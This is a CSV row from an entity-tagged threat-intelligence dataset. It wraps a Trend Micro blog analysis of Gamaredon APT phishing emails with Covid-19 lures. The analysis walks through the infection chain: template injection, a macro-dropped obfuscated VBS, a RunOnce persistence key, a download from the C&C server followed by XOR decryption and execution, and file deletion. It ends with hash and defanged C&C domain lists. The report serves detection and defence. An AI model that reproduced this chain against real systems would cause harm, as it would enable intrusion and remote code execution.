DocName,text,threat_actor_KeyWords,software_KeyWords,industry_KeyWords,org_KeyWords,timestamp_KeyWords,malware_KeyWords,country_KeyWords,ioc_KeyWords,identity_KeyWords,campaign_KeyWords,tool_KeyWords,mitre_attack_KeyWords,theat_actor_KeyWords,attack_pattern_KeyWords,technique_KeyWords,city_KeyWords,cve_KeyWords,threat_actor_Sum,software_Sum,industry_Sum,org_Sum,timestamp_Sum,malware_Sum,country_Sum,ioc_Sum,identity_Sum,campaign_Sum,tool_Sum,mitre_attack_Sum,theat_actor_Sum,attack_pattern_Sum,technique_Sum,city_Sum,cve_Sum
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,"4/27/2020 <THREAT_ACTOR>Gamaredon</THREAT_ACTOR> APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog

https://blog.trendmicro.com/trendlabs-security-intelligence/<THREAT_ACTOR>Gamaredon</THREAT_ACTOR>-apt-group-use-covid-19-lure-in-campaigns/?fbclid=IwAR2SzsXuDFjCsID7AdOyoE_U… 1/7

<ORG>Trend Micro</ORG>
About TrendLabs Security Intelligence Blog

Search:
 

Go to…

Home
Categories

Home   »   Malware   »   <THREAT_ACTOR>Gamaredon</THREAT_ACTOR> APT Group Use Covid-19 Lure in Campaigns

<THREAT_ACTOR>Gamaredon</THREAT_ACTOR> APT Group Use Covid-19 Lure in Campaigns
Posted on:<TIMESTAMP>April 17, 2020 at 5:12 am</TIMESTAMP>
Posted in:Malware, Spam, Targeted Attacks
Author:
<ORG>Trend Micro</ORG>

0

By <IDENTITY>Hiroyuki Kakara</IDENTITY> and <IDENTITY>Erina Maruyama</IDENTITY>

<THREAT_ACTOR>Gamaredon</THREAT_ACTOR> is an advanced persistent threat (APT) group that has been active since 2013. Their campaigns are generally known for targeting <ORG>Ukrainian government</ORG>
institutions. From late 2019 to February of this year, researchers published several reports on <THREAT_ACTOR>Gamaredon</THREAT_ACTOR>, tracking the group’s activities.

In March, we came across an email with a malware attachment that used the <THREAT_ACTOR>Gamaredon</THREAT_ACTOR> group’s tactics. Some of the emails used the coronavirus pandemic as a topic
to lure victims into opening emails and attachments. These campaigns targeted victims in European countries and others.

A brief history of <THREAT_ACTOR>Gamaredon</THREAT_ACTOR>

In 2015, researchers from <ORG>LookingGlass</ORG> published the first report on <THREAT_ACTOR>Gamaredon</THREAT_ACTOR>. According to that report, the early campaigns used Microsoft Word documents that,
when inspected, showed that its most recent user went by the name of Armagedon (a misspelled “Armageddon”), which became the basis of the group’s namesake.

The report also described <THREAT_ACTOR>Gamaredon</THREAT_ACTOR>’s political beginnings, particularly its ties to the Ukrainian revolution in 2014. Before the revolution they had targeted
Ukrainian government officials, opposition party members, and journalists. They moved on to Ukrainian government institutions after the revolution. In 2018, CERT-
UA published an advisory against the malware Pterodo, which the group allegedly used.

The group remained active, with several <THREAT_ACTOR>Gamaredon</THREAT_ACTOR>-related activities reported in <TIMESTAMP>February 2020</TIMESTAMP>. In March, they were among the threat groups that were identified
taking advantage of the coronavirus pandemic to trick targets.

<THREAT_ACTOR>Gamaredon</THREAT_ACTOR> and Covid-19-related cover emails

https://www.trendmicro.com/
https://blog.trendmicro.com/trendlabs-security-intelligence/about-us/
https://twitter.com/trendmicrorsrch
http://www.facebook.com/trendmicro
http://www.linkedin.com/company/trend-micro
http://www.youtube.com/user/TrendMicroInc
http://feeds.trendmicro.com/Anti-MalwareBlog
https://blog.trendmicro.com/trendlabs-security-intelligence/
http://blog.trendmicro.com/trendlabs-security-intelligence/
https://blog.trendmicro.com/trendlabs-security-intelligence/
https://blog.trendmicro.com/trendlabs-security-intelligence/category/malware/
https://blog.trendmicro.com/trendlabs-security-intelligence/2020/04/
https://blog.trendmicro.com/trendlabs-security-intelligence/category/malware/
https://blog.trendmicro.com/trendlabs-security-intelligence/category/spam/
https://blog.trendmicro.com/trendlabs-security-intelligence/category/targeted_attacks/
https://blog.trendmicro.com/trendlabs-security-intelligence/author/trend-micro/
https://blog.trendmicro.com/trendlabs-security-intelligence/<THREAT_ACTOR>Gamaredon</THREAT_ACTOR>-apt-group-use-covid-19-lure-in-campaigns/#respond
https://www.lookingglasscyber.com/wp-content/uploads/2015/08/Operation_Armageddon_Final.pdf
https://cert.gov.ua/news/46
https://www.csoonline.com/article/3532825/6-ways-attackers-are-exploiting-the-covid-19-crisis.html
https://blog.trendmicro.com/trendlabs-security-intelligence/files/2020/04/figure-1.jpg


4/27/2020 <THREAT_ACTOR>Gamaredon</THREAT_ACTOR> APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog

https://blog.trendmicro.com/trendlabs-security-intelligence/Gamaredon-apt-group-use-covid-19-lure-in-campaigns/?fbclid=IwAR2SzsXuDFjCsID7AdOyoE_U… 2/7

Figure 1. The infection chain of the <THREAT_ACTOR>Gamaredon</THREAT_ACTOR> campaign

The case we found arrived through a targeted email that contained a document file (in docx format). Opening document starts a template injection technique for
loading the document template from the internet. The downloaded document template contains the malicious macro codes, which executes a VBScript (VBS). We
found a mechanism for decrypting, executing, and downloading an additional payload from the C&C server. During the time of the analysis however, the C&C server
was not accessible, which made us unable to get additional payloads.

The attacks we found all arrived through targeted emails (MITRE ATT&CK framework ID <MITRE_ATTACK>T1193</MITRE_ATTACK>). One of them even had the subject “Coronavirus (2019-nCoV).”
The use of socially relevant topics is a common practice for attackers who wish to make their emails and documents more tempting to open. The email that used the
coronavirus-related subject came with an attached document file. Opening this file (MITRE ATT&CK framework ID <MITRE_ATTACK>T1204</MITRE_ATTACK>) executes the template injection method
(MITRE ATT&CK framework ID <MITRE_ATTACK>T1221</MITRE_ATTACK>).

Figure 2. Code for downloading the document template with the malicious macro

The downloaded document template (in dot format) could differ slightly depending on each download. However, its Exif info or metadata remains consistent and
shares the following details:

Identification: Word 8.0
Language code: Russian
System: <SOFTWARE>Windows</SOFTWARE>
Author: АДМИН (“Administrator” in Russian)
Code page: Windows Cyrillic

Figure 3. A sample of malicious macro in the downloaded template document

As mentioned, the template contains malicious macro (MITRE ATT&CK framework ID <MITRE_ATTACK>T1064</MITRE_ATTACK>), which exports VBS (MITRE ATT&CK framework ID <MITRE_ATTACK>T1064</MITRE_ATTACK>) to
execute itself. More specifically it drops “%USERPROFILE%\Documents\MediaPlayer\PlayList.vbs,” which is hardcoded in the macro, and then executed in
“wscript.exe //b %USERPROFILE%\Documents\MediaPlayer\PlayList.vbs.”

Figure 4. A content sample for VBS dropped by malicious macro

PlayList.vbs contains the obfuscated codes (MITRE ATT&CK framework ID <MITRE_ATTACK>T1140</MITRE_ATTACK>), which it executes after decrypting the obfuscations. This particular behavior is
a slight departure from previously reported attacks by <THREAT_ACTOR>Gamaredon</THREAT_ACTOR>, which did not use this technique.

https://attack.mitre.org/techniques/T1193/
https://attack.mitre.org/techniques/T1204/
https://attack.mitre.org/techniques/T1221/
https://blog.trendmicro.com/trendlabs-security-intelligence/files/2020/04/figure-2.jpg
https://blog.trendmicro.com/trendlabs-security-intelligence/files/2020/04/figure-3.jpg
https://attack.mitre.org/techniques/T1064/
https://attack.mitre.org/techniques/T1064/
https://blog.trendmicro.com/trendlabs-security-intelligence/files/2020/04/figure-4.jpg
https://attack.mitre.org/techniques/T1140/


4/27/2020 <THREAT_ACTOR>Gamaredon</THREAT_ACTOR> APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog

https://blog.trendmicro.com/trendlabs-security-intelligence/<THREAT_ACTOR>Gamaredon</THREAT_ACTOR>-apt-group-use-covid-19-lure-in-campaigns/?fbclid=IwAR2SzsXuDFjCsID7AdOyoE_U… 3/7

Figure 5. A sample of executed VBS

Figure 5 shows a snippet of the VBS executed by the Execute function. The routines it follows are enumerated below.

1. Register the RUN key in the registry below, so that the VBS file is executed every time the machine starts (MITRE ATT&CK framework ID <MITRE_ATTACK>T1060</MITRE_ATTACK>)
Registry: HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce\MediaPlayer wscript.exe //b
<IOC>％USERPROFILE%\Documents\MediaPlayer\PlayList.vbs</IOC>

2. Connect with “hxxp:// kristom[.]hopto[.]org /{computer name}_{hexadecimal volume serious number}/help_05_03[.]php” (MITRE ATT&CK framework IDs
<MITRE_ATTACK>T1043</MITRE_ATTACK>, <MITRE_ATTACK>T1071</MITRE_ATTACK>, <MITRE_ATTACK>T1082</MITRE_ATTACK>)

3. If the downloaded file size in the first step exceeds 10,485 bytes, then the file is saved as “<IOC>%APPDATA%\\Microsoft\Windows\Cookies.txt</IOC>” (MITRE ATT&CK
framework ID <MITRE_ATTACK>T1105</MITRE_ATTACK>)

4. Use XOR for the file saved from the second step, where ASCII code converted from its own hexadecimal volume serial number is used as the key. The
decrypted result is saved as “<IOC>%APPDATA%\\Microsoft\Windows\Cookies.exe</IOC>” (<MITRE_ATTACK>T1001</MITRE_ATTACK>)

5. If the file size of “%APPDATA%\\Microsoft\Windows\Cookies.exe” exceeds 4,485 bytes, it is executed.
6. Both “%APPDATA%\\Microsoft\Windows\Cookies.txt” and “%APPDATA%\\Microsoft\Windows\Cookies.exe” are then deleted (MITRE ATT&CK

framework ID <MITRE_ATTACK>T1107</MITRE_ATTACK>)

The observed routines of this VBS closely follow the other reports published on <THREAT_ACTOR>Gamaredon</THREAT_ACTOR>, such as the one from SentinelOne. However, the macro generated VBS
was obfuscated in this case, likely as an additional evasive tactic.

Interestingly, after decoding the VBS, we saw what appeared to be a programming mistake by the attacker. Lines 53 and 54 in figure 6 are for closing those
downloaded and decoded TXT and EXE files, which are variables defined right before the IF statement. If, however, these lines do not pass through this IF statement,
an error would occur. It shows that this malware is not tested enough, and may still be under development.

Our analysis found several URLs of the network destinations for both template injection and VBS. While resolving them to IP addresses to understand their attack
bases, we also found that they were all linked to the following IP addresses.

Network destination for template injection: 176[.]119[.]147[.]225
Network destination for VBS: 176[.]57[.]215[.]115

These IP addresses are from Russian hosting companies. Most likely, the attackers rented Virtual Private Server (VPS) as their attack base. Their URL for VBS
(shown below) likely includes the data when they conducted the attack.

hxxp://{FQDN}/{computer name}_{hexadecimal volume serial number}/help_{day}_{month}[.]php

Conclusion

<THREAT_ACTOR>Gameradon</THREAT_ACTOR> is not the first group to take advantage of the Covid-19 topic. Some cybercriminals have taken to indirect means of profiting, such as by targeting
communication platforms that have increased in popularity after organizations shifted to work from home setups. In this case, they used Covid-19 as a cover for their
relatively typical APT routine. We recommend these countermeasures to prevent similar APT attacks in the future:

https://blog.trendmicro.com/trendlabs-security-intelligence/files/2020/04/figure-5.jpg
https://attack.mitre.org/techniques/T1043/
https://attack.mitre.org/techniques/T1071/
https://attack.mitre.org/techniques/T1082/
https://attack.mitre.org/techniques/T1105/
https://attack.mitre.org/techniques/T1001/
https://attack.mitre.org/techniques/T1107/
https://labs.sentinelone.com/pro-russian-cyberspy-<THREAT_ACTOR>Gamaredon</THREAT_ACTOR>-intensifies-ukrainian-security-targeting/
https://blog.trendmicro.com/trendlabs-security-intelligence/zoomed-in-a-look-into-a-coinminer-bundled-with-zoom-installer/


4/27/2020 <THREAT_ACTOR>Gamaredon</THREAT_ACTOR> APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog

https://blog.trendmicro.com/trendlabs-security-intelligence/<THREAT_ACTOR>Gamaredon</THREAT_ACTOR>-apt-group-use-covid-19-lure-in-campaigns/?fbclid=IwAR2SzsXuDFjCsID7AdOyoE_U… 4/7

Check the email sender, subject, and body for anything suspicious before downloading and opening email attachments. Be especially wary of unsolicited
emails, that come from unknown senders.
Check the file extension of the attached file and make sure it is the intended file format.
Avoid activating macro for any attached Microsoft Office files, especially for emails that request macro activation using an image of the body of the opened file
or those that don’t show anything.
Watch out for spoofed domains embedded in emails before opening them. Subtle changes to a popular URL can be one indicator of malicious content.

In addition to these actions, users can also implement a multi-layer approach and take advantage of these solutions.

<ORG>Trend Micro</ORG>™ Smart Protection Suitesand Worry-Free™ Business Security protects users and businesses from similar threats by detecting malicious files and
spammed messages as well as blocking all related malicious URLs. <ORG>Trend Micro</ORG> <SOFTWARE>Deep Discovery</SOFTWARE>™ has an email inspection layer that can protect enterprises
by detecting malicious attachments and URLs.
<ORG>Trend Micro</ORG>™ Hosted Email Securityis a no-maintenance cloud solution that delivers continuously updated protection to stop spam, malware, spear phishing,
ransomware, and advanced targeted attacks before they reach the network. It protects Microsoft Exchange, Microsoft Office 365, Google Apps, and other
hosted and on-premises email solutions.
<ORG>Trend Micro</ORG>™ <SOFTWARE>OfficeScan</SOFTWARE>™with XGen™ endpoint security infuses high-fidelity machine learning with other detection technologies and global threat
intelligence for comprehensive protection against advanced malware.
The <ORG>Trend Micro</ORG> <SOFTWARE>TMXDR</SOFTWARE> solution effectively protects connected emails, endpoints, servers, cloud workloads, and networks. <ORG>Trend Micro</ORG> XDR uses powerful
AI and expert security analytics to correlate data, as well as deliver fewer yet higher-fidelity alerts for early threat detection. In a single console, it provides a
broader perspective of enterprise systems while at the same time giving a more focused and optimized set of alerts.

Indicators of Compromise (IoCs)

DOCX file

SHA256 Detection Name

<IOC>0d90fe36866ee30eb5e4fd98583bc2fdb5b7da37e42692f390ac5f807a13f057</IOC> W97M_CVE2017019

<IOC>036c2088cb48215f21d4f7d751d750b859d57018c04f6cadd45c0c4fee23a9f8</IOC> Trojan.W97M.CVE2

<IOC>19d03a25af5b71e859561ff8ccc0a073acb9c61b987bdb28395339f72baf46b4</IOC> Trojan.XML.PHISH.

<IOC>62cf22f840fffd8d8781e52b492b03b4efc835571b48823b07535d52b182e861</IOC> W97M_CVE2017019

<IOC>8310d39aa1cdd13ca82c769d61049310f8ddaea7cd2c3b940a8a3c248e5e7b06</IOC> Trojan.W97M.CVE2

<IOC>84e0b1d94a43c87de55c000e3acae17f4493a57badda3b27146ad8ed0f90c93e</IOC> Trojan.W97M.CVE2

<IOC>85267e52016b6124e4e42f8b52e68475174c8a2bdf0bc0b501e058e2d388a819</IOC> Trojan.W97M.CVE2

<IOC>b6a94f565d482906be7da4d801153eb4dab46d92f43be3e1d59ddd2c7f328109</IOC> Trojan.W97M.CVE2

<IOC>cc775e3cf1a64effa55570715b73413c3ea3a6b47764a998b1272b5be059c25b</IOC> Trojan.W97M.CVE2

DOT file
SHA256 Detection Name TrendX
<IOC>00b761bce25594da4c760574d224589daf01086c5637042982767a13a2f61bea</IOC> Mal_OLEMAL-4

Downloader.VBA.TRX.XXVBAF01FF00
7

<IOC>250b09f87fe506fbc6cedf9dbfcb594f7795ed0e02f982b5837334f09e8a184b</IOC> <MALWARE>Mal_OLEMAL-4</MALWARE>
<IOC>4b3ae36b04d6aba70089cb2099e6bc1ba16d16ea24bbf09992f23260151b9faf</IOC> <MALWARE>Mal_OLEMAL-4</MALWARE>
<IOC>946405e2f26e1cc0bd22bc7e12d403da939f02e9c4d8ddd012f049cf4bf1fda9</IOC> <MALWARE>Mal_OLEMAL-4</MALWARE>
<IOC>9cd5fa89d579a664c28da16064057096a5703773cef0a079f228f21a4b7fd5d2</IOC> <MALWARE>Mal_OLEMAL-4</MALWARE>
<IOC>c089ccd376c9a4d5e5bdd553181ab4821d2c26fefc299cce7a4f023a660484d5</IOC> <MALWARE>Mal_OLEMAL-4</MALWARE>

<IOC>e888b5e657b41d45ef0b2ed939e27ff9ea3a11c46946e31372cf26d92361c012</IOC> <MALWARE>W97M_VBSDOWNLDR.ZKHC-A</MALWARE>

<IOC>f577d2b97963b717981c01b535f257e03688ff4a918aa66352aa9cd31845b67d</IOC> <MALWARE>W97M_VBSDOWNLDR.ZYHC-A</MALWARE>

https://www.trendmicro.com/us/business/complete-user-protection/index.html
https://www.trendmicro.com/us/small-business/product-security/
https://www.trendmicro.com/us/enterprise/security-risk-management/deep-discovery/
https://www.trendmicro.com/us/small-business/hosted-email-security/
https://www.trendmicro.com/us/business/saas/cloud-app-security/office-365/index.html
https://www.trendmicro.com/us/enterprise/product-security/officescan/
https://www.trendmicro.com/us/business/xgen/index.html
https://www.trendmicro.com/en_us/business/products/detection-response/xdr.html
https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/Trojan.XML.PHISH.AE
https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/W97M_VBSDOWNLDR.ZYHC-A


4/27/2020 <THREAT_ACTOR>Gamaredon</THREAT_ACTOR> APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog

https://blog.trendmicro.com/trendlabs-security-intelligence/<THREAT_ACTOR>Gamaredon</THREAT_ACTOR>-apt-group-use-covid-19-lure-in-campaigns/?fbclid=IwAR2SzsXuDFjCsID7AdOyoE_U… 5/7

SHA256 Detection Name <MALWARE>TrendX</MALWARE>
17161e0ab3907f637c2202a384de67fca49171c
79b1b24db7c78a4680637e3d5

<MALWARE>Trojan.X97M.CVE20171</MALWARE>
1882.THCOCBO

<MALWARE>Downloader.VBA.TRX</MALWARE>
.XXVBAF01FF006

<IOC>29367502e16bf1e2b788705014d0142d8bcb7fcc6a47d56fb82d7e333454e923</IOC>

<MALWARE>TrojanSpy.Win32.FAREIT.UHBAZCLIZ N/A</MALWARE>

<IOC>315e297ac510f3f2a60176f9c12fcf92681bbad758135767ba805cdea830b9ee</IOC>

<MALWARE>Trojan.X97M.CVE20171</MALWARE>
1882.THCOCBO

<MALWARE>Downloader.VBA.TRX.XXVBAF01FF006</MALWARE>

<IOC>3e6166a6961bc7c23d316ea9bca87d8287a4044865c3e73064054e805ef5ca1a</IOC>

<MALWARE>Backdoor.Win32.REMCOS.USMANEAGFG</MALWARE>

<MALWARE>Troj.Win32.TRX.XXPE50FFF034</MALWARE>

<IOC>3f40d4a0d0fe1eea58fa1c71308431b5c2ce6e381cacc7291e501f4eed57bfd2</IOC>

<MALWARE>Trojan.MSIL.AGENTTESLA.THCOCBO N/A</MALWARE>

<IOC>ab533d6ca0c2be8860a0f7fbfc7820ffd595edc63e540ff4c5991808da6a257d</IOC>

<MALWARE>Trojan.X97M.CVE201711882.THCOCBO N/A</MALWARE>

<IOC>b78a3d21325d3db7470fbf1a6d254e23d349531fca4d7f458b33ca93c91e61cd</IOC>

<MALWARE>Backdoor.Win32.REMCOS.USMANEAGFE</MALWARE>

<MALWARE>Troj.Win32.TRX.XXPE50FFF034</MALWARE>

<IOC>c9c0180eba2a712f1aba1303b90cbf12c1117451ce13b68715931abc437b10cd</IOC>

<MALWARE>TrojanSpy.Win32.FAREIT.UHBAZCLIZ</MALWARE>

<MALWARE>Troj.Win32.TRX.XXPE50FFF034</MALWARE>

C&C addresses

Bambinos[.]bounceme[.]net
bbtt[.]site
bbtt[.]space
harpa[.]site
harpa[.]space
harpa[.]website
himym[.]site
kristoffer[.]hopto[.]org
kristom[.]hopto[.]org
miragena[.]site
miragena[.]xyz
papir[.]hopto[.]org
sabdja[.]3utilities[.]com
sakira[.]3utilities[.]com
seliconos[.]3utilities[.]com
solod[.]bounceme[.]net
sonik[.]hopto[.]org
tele[.]3utilities[.]com
violina[.]website
voyager[.]myftp[.]biz
voyaget[.]myftp[.]biz

Mitre ATT&CK Framework

Related Posts:

Operation ENDTRADE: Finding Multi-Stage Backdoors that TICK
Spam Campaign Targets Colombian Entities with Custom-made ‘<MALWARE>Proyecto RAT</MALWARE>,’ Uses Email Service YOPmail for C&C
Mac Backdoor Linked to <THREAT_ACTOR>Lazarus</THREAT_ACTOR> Targets Korean Users
Outlaw Updates Kit to Kill Older Miner Versions, Targets More Systems

Learn how to protect Enterprises, Small Businesses, and Home Users from ransomware:

ENTERPRISE SMALL BUSINESS HOME

Tags: APT

» » »

https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/TrojanSpy.Win32.FAREIT.UHBAZCLIZ
https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/Backdoor.Win32.REMCOS.USMANEAGFG
https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/Trojan.MSIL.AGENTTESLA.THCOCBO
https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/TrojanSpy.Win32.FAREIT.UHBAZCLIZ
https://blog.trendmicro.com/trendlabs-security-intelligence/files/2020/04/mitre.jpg
https://blog.trendmicro.com/trendlabs-security-intelligence/operation-endtrade-finding-multi-stage-backdoors-that-tick/
https://blog.trendmicro.com/trendlabs-security-intelligence/spam-campaign-targets-colombian-entities-with-custom-proyecto-rat-email-service-yopmail-for-cc/
https://blog.trendmicro.com/trendlabs-security-intelligence/mac-backdoor-linked-to-lazarus-targets-korean-users/
https://blog.trendmicro.com/trendlabs-security-intelligence/outlaw-updates-kit-to-kill-older-miner-versions-targets-more-systems/
http://www.trendmicro.com/us/security-intelligence/enterprise-ransomware/index.html
http://www.trendmicro.com/us/security-intelligence/small-business-ransomware/index.html
http://www.trendmicro.com/us/home/consumer-ransomware/index.html
https://blog.trendmicro.com/trendlabs-security-intelligence/tag/apt/


4/27/2020 <THREAT_ACTOR>Gamaredon</THREAT_ACTOR> APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog

https://blog.trendmicro.com/trendlabs-security-intelligence/Gamaredon-apt-group-use-covid-19-lure-in-campaigns/?fbclid=IwAR2SzsXuDFjCsID7AdOyoE_U… 6/7

Security Predictions for 2020

Cybersecurity in 2020 will be viewed through many lenses — from differing attacker motivations and cybercriminal arsenal to technological developments and
global threat intelligence — only so defenders can keep up with the broad range of threats.
Read our security predictions for 2020.

Business Process Compromise

Attackers are starting to invest in long-term operations that target specific processes enterprises rely on. They scout for vulnerable practices, susceptible
systems and operational loopholes that they can leverage or abuse. To learn more, read our Security 101: Business Process Compromise.

Recent Posts

Exposed Redis Instances Abused for Remote Code Execution, Cryptocurrency Mining
Grouping Linux IoT Malware Samples With <ORG>Trend Micro</ORG> ELF Hash
<THREAT_ACTOR>Gamaredon</THREAT_ACTOR> APT Group Use Covid-19 Lure in Campaigns
Exposing Modular Adware: How DealPly, IsErIk, and ManageX Persist in Systems
April Patch Tuesday: Fixes for Font-Related, Microsoft SharePoint, Windows Components Vulnerabilities

Popular Posts

More Than 8,000 Unsecured Redis Instances Found in the Cloud

Raccoon Stealer’s Abuse of Google Cloud Services and Multiple Delivery Techniques

Dissecting Geost: Exposing the Anatomy of the Android Trojan Targeting Russian Banks

Operation <CAMPAIGN>Poisoned News</CAMPAIGN>: Hong Kong Users Targeted With Mobile Malware via Local News Links

Coronavirus Update App Leads to Project Spy Android and iOS Spyware

Stay Updated

Email Subscription
Your email here

Subscribe

Home and Home Office
|
For Business
|
Security Intelligence
|
About <ORG>Trend Micro</ORG>

Asia Pacific Region (APAC): <COUNTRY>Australia</COUNTRY> / <COUNTRY>New Zealand</COUNTRY>, 中国, ⽇本, 대한민국, 台灣
Latin America Region (LAR): <COUNTRY>Brasil</COUNTRY>, México
North America Region (NABU): <COUNTRY>United States</COUNTRY>, <COUNTRY>Canada</COUNTRY> 
Europe, Middle East, & Africa Region (EMEA): <COUNTRY>France</COUNTRY>, <COUNTRY>Deutschland</COUNTRY> / Österreich / <COUNTRY>Schweiz</COUNTRY>, <COUNTRY>Italia</COUNTRY>, Россия, España, <COUNTRY>United Kingdom</COUNTRY> / <COUNTRY>Ireland</COUNTRY>

0 Comments TrendLabs 🔒 Privacy Policy Login1

t Tweet f Share Sort by Best

LOG IN WITH OR SIGN UP WITH DISQUS 

Name

Start the discussion…

?

Be the first to comment.

Subscribe✉ Add Disqus to your siteAdd DisqusAddd
D N t S ll M D t⚠

 Recommend

https://www.trendmicro.com/vinfo/us/security/research-and-analysis/predictions/2020
https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/security-101-business-process-compromise
https://blog.trendmicro.com/trendlabs-security-intelligence/exposed-redis-instances-abused-for-remote-code-execution-cryptocurrency-mining/
https://blog.trendmicro.com/trendlabs-security-intelligence/grouping-linux-iot-malware-samples-with-trend-micro-elf-hash/
https://blog.trendmicro.com/trendlabs-security-intelligence/<THREAT_ACTOR>Gamaredon</THREAT_ACTOR>-apt-group-use-covid-19-lure-in-campaigns/
https://blog.trendmicro.com/trendlabs-security-intelligence/exposing-modular-adware-how-dealply-iserik-and-managex-persist-in-systems/
https://blog.trendmicro.com/trendlabs-security-intelligence/april-patch-tuesday-fixes-for-font-related-microsoft-sharepoint-windows-components-vulnerabilities/
https://blog.trendmicro.com/trendlabs-security-intelligence/more-than-8000-unsecured-redis-instances-found-in-the-cloud/
https://blog.trendmicro.com/trendlabs-security-intelligence/raccoon-stealers-abuse-of-google-cloud-services-and-multiple-delivery-techniques/
https://blog.trendmicro.com/trendlabs-security-intelligence/dissecting-geost-exposing-the-anatomy-of-the-android-trojan-targeting-russian-banks/
https://blog.trendmicro.com/trendlabs-security-intelligence/operation-poisoned-news-hong-kong-users-targeted-with-mobile-malware-via-local-news-links/
https://blog.trendmicro.com/trendlabs-security-intelligence/coronavirus-update-app-leads-to-project-spy-android-and-ios-spyware/
http://www.trendmicro.com/us/home/index.html
http://www.trendmicro.com/us/business/index.html
http://www.trendmicro.com/us/security-intelligence/index.html
http://www.trendmicro.com/us/about-us/index.html
http://www.trendmicro.com.au/au/home/index.html
http://www.trendmicro.co.nz/nz/home/index.html
http://cn.trendmicro.com/cn/home/index.html
http://jp.trendmicro.com/jp/home/index.html
http://www.trendmicro.co.kr/index.html
http://tw.trendmicro.com/tw/home/index.html
http://br.trendmicro.com/br/home/index.html
http://la.trendmicro.com/la/home/index.html
http://www.trendmicro.com/us/index.html
http://ca.trendmicro.com/ca/home/index.html
http://www.trendmicro.fr/
http://www.trendmicro.de/
http://www.trendmicro.it/
http://www.trendmicro.com.ru/
http://www.trendmicro.es/
http://www.trendmicro.co.uk/
https://disqus.com/
https://disqus.com/home/forums/trendlabs/
https://help.disqus.com/customer/portal/articles/466259-privacy-policy
https://disqus.com/home/inbox/
https://publishers.disqus.com/engage?utm_source=trendlabs&utm_medium=Disqus-Footer
https://disqus.com/data-sharing-settings/


4/27/2020 <THREAT_ACTOR>Gamaredon</THREAT_ACTOR> APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog

https://blog.trendmicro.com/trendlabs-security-intelligence/Gamaredon-apt-group-use-covid-19-lure-in-campaigns/?fbclid=IwAR2SzsXuDFjCsID7AdOyoE_U… 7/7

Privacy Statement
Legal Policies

Copyright © 2020 <ORG>Trend Micro</ORG> Incorporated. All rights reserved.

http://www.trendmicro.com/us/about-us/legal-policies/privacy-statement/index.html
http://www.trendmicro.com/us/about-us/legal-policies/index.html",Gamaredon;Gameradon;Lazarus,Windows;Deep Discovery;OfficeScan;TMXDR,,Trend Micro;Ukrainian government;LookingGlass,"April 17, 2020 at 5:12 am;February 2020",Mal_OLEMAL-4;Troj.Win32.TRX.XXPE50FFF034;Trojan.X97M.CVE20171;W97M_VBSDOWNLDR.ZKHC-A;W97M_VBSDOWNLDR.ZYHC-A;TrendX;Downloader.VBA.TRX;TrojanSpy.Win32.FAREIT.UHBAZCLIZ N/A;Downloader.VBA.TRX.XXVBAF01FF006;Backdoor.Win32.REMCOS.USMANEAGFG;Trojan.MSIL.AGENTTESLA.THCOCBO N/A;Trojan.X97M.CVE201711882.THCOCBO N/A;Backdoor.Win32.REMCOS.USMANEAGFE;TrojanSpy.Win32.FAREIT.UHBAZCLIZ;Proyecto RAT,Australia;New Zealand;Brasil;United States;Canada;France;Deutschland;Schweiz;Italia;United Kingdom;Ireland,％USERPROFILE%\Documents\MediaPlayer\PlayList.vbs;%APPDATA%\\Microsoft\Windows\Cookies.txt;%APPDATA%\\Microsoft\Windows\Cookies.exe;0d90fe36866ee30eb5e4fd98583bc2fdb5b7da37e42692f390ac5f807a13f057;036c2088cb48215f21d4f7d751d750b859d57018c04f6cadd45c0c4fee23a9f8;19d03a25af5b71e859561ff8ccc0a073acb9c61b987bdb28395339f72baf46b4;62cf22f840fffd8d8781e52b492b03b4efc835571b48823b07535d52b182e861;8310d39aa1cdd13ca82c769d61049310f8ddaea7cd2c3b940a8a3c248e5e7b06;84e0b1d94a43c87de55c000e3acae17f4493a57badda3b27146ad8ed0f90c93e;85267e52016b6124e4e42f8b52e68475174c8a2bdf0bc0b501e058e2d388a819;b6a94f565d482906be7da4d801153eb4dab46d92f43be3e1d59ddd2c7f328109;cc775e3cf1a64effa55570715b73413c3ea3a6b47764a998b1272b5be059c25b;00b761bce25594da4c760574d224589daf01086c5637042982767a13a2f61bea;250b09f87fe506fbc6cedf9dbfcb594f7795ed0e02f982b5837334f09e8a184b;4b3ae36b04d6aba70089cb2099e6bc1ba16d16ea24bbf09992f23260151b9faf;946405e2f26e1cc0bd22bc7e12d403da939f02e9c4d8ddd012f049cf4bf1fda9;9cd5fa89d579a664c28da16064057096a5703773cef0a079f228f21a4b7fd5d2;c089ccd376c9a4d5e5bdd553181ab4821d2c26fefc299cce7a4f023a660484d5;e888b5e657b41d45ef0b2ed939e27ff9ea3a11c46946e31372cf26d92361c012;f577d2b97963b717981c01b535f257e03688ff4a918aa66352aa9cd31845b67d;29367502e16bf1e2b788705014d0142d8bcb7fcc6a47d56fb82d7e333454e923;315e297ac510f3f2a60176f9c12fcf92681bbad758135767ba805cdea830b9ee;3e6166a6961bc7c23d316ea9bca87d8287a4044865c3e73064054e805ef5ca1a;3f40d4a0d0fe1eea58fa1c71308431b5c2ce6e381cacc7291e501f4eed57bfd2;ab533d6ca0c2be8860a0f7fbfc7820ffd595edc63e540ff4c5991808da6a257d;b78a3d21325d3db7470fbf1a6d254e23d349531fca4d7f458b33ca93c91e61cd;c9c0180eba2a712f1aba1303b90cbf12c1117451ce13b68715931abc437b10cd,Hiroyuki Kakara;Erina Maruyama,Poisoned 